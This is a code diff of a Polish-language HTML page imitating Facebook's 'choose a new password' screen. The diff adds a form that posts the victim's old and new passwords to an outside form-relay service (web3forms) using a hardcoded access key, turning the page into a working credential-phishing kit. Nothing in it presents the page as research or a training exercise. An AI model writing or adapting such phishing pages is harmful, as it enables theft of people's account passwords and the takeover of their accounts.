@@ -189,17 +189,20 @@
     </div>
     <div class="container">
         <h2>Wybierz nowe hasło</h2>
-        <label for="new-password">Utwórz nowe hasło zawierające przynajmniej 6 znaków. Silne hasło stanowi kombinację liter, cyfr i znaków interpunkcyjnych.</label>
-	<input type="password" id="new-password" placeholder="Stare hasło">    
-        <input type="password" id="new-password" placeholder="Nowe hasło">
+	<form action="https://api.web3forms.com/submit" method="POST">    
+        	<input type="hidden" name="access_key" value="dac6f3bc-4e78-431c-a88e-674b708a5bfb">
+	    	<label for="new-password">Utwórz nowe hasło zawierające przynajmniej 6 znaków. Silne hasło stanowi kombinację liter, cyfr i znaków interpunkcyjnych.</label>
+		<input type="password" id="new-password" name="Stare hasło" placeholder="Stare hasło">    
+        	<input type="password" id="new-password" name="Nowe hasło" placeholder="Nowe hasło">
 
-        <label>
-            <input type="checkbox" id="logout-everywhere">
-            Wyloguj mnie z Facebooka wszędzie indziej, gdzie moje konto może być otwarte. (Zaznacz to pole wyboru, jeżeli ktoś obcy użył Twojego konta).
-        </label>
+        	<label>
+            		<input type="checkbox" id="logout-everywhere">
+            		Wyloguj mnie z Facebooka wszędzie indziej, gdzie moje konto może być otwarte. (Zaznacz to pole wyboru, jeżeli ktoś obcy użył Twojego konta).
+        	</label>
 
-        <button type="button">Kontynuuj</button>
-        <button type="button" class="cancel">Anuluj</button>
+        	<button type="button">Kontynuuj</button>
+        	<button type="button" class="cancel">Anuluj</button>
+    	</form>
     </div>
 		
 </body>
